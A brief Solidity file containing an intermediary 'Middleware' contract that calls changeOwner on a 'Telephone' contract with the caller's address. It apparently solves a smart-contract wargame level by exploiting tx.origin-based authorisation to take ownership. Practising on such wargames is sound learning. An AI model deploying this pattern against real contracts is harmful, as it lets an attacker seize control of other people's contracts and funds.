pragma solidity ^0.8;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract Middleware {
    ITelephone telephoneInstance;

    constructor(address telephoneAddress) {
        telephoneInstance = ITelephone(telephoneAddress);
    }

    function changeOwner() public {
        telephoneInstance.changeOwner(msg.sender);
    }
}
